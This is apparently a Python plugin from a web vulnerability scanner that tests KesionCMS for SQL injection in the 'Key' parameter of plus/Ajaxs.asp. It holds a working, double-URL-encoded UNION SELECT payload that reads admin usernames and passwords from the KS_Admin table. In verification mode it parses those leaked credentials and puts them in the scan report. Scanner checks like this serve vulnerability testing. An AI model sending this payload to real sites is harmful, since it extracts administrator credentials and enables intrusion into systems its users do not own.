#!/usr/bin/python
# -*- coding: utf-8 -*-
from lib.common import *
def run_domain(http,ob):
    try:  
        result=[]                               
        detail=u'漏洞文件‘Ajaxs.asp’，没有对参数‘Key’进行处理就直接带入到SQL语句去查询导致产生SQL注入漏洞。\n\n'
        detail=detail.encode('utf8')
        domain=ob['domain']
        url="plus/Ajaxs.asp?action=GetRelativeItem&Key=goingta%2525%2527%2529%2520%2575%256E%2569%256F%256E%2520%2573%2565%256C%2565%2563%2574%25201,2,username%252B%2527NVS_TEST%2527%252Bpassword%20from%20KS_Admin%2500"
        geturl="%s://%s%s%s"%(ob['scheme'],domain,ob['base_path'],url)        
        response,content=requestUrl(http,geturl,ob['task_id'],ob['domain_id'])
        try:
            content=content.decode('gb2312').encode('utf8')
        except UnicodeDecodeError:
            return result
        #print content
        if content.find("<option value='1|2'>")>=0 and content.find("NVS_TEST")>=0:
            getvalue= content.replace("<option value='1|2'>","")
            #print getvalue
            #print "=========="
            getvalue=getvalue.replace("NVS_TEST","||").replace("</option>","\n")
            #print getvalue
            
                
            request = getRequest(geturl)
            response = getResponse(response)
            if ob['isstart']=='1':
                result.append(getRecord(ob,ob['scheme']+"://"+domain,ob['level'],detail+"验证性扫描结果：\n"+getvalue,request,response))
            else:
                result.append(getRecord(ob,ob['scheme']+"://"+domain,ob['level'],detail,request,response))
    except Exception, e:
        logging.getLogger().error("File:kesionCMSsqlINJECTION.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:kesionCMSsqlINJECTION.py, run_domain function :" + str(e))
    return result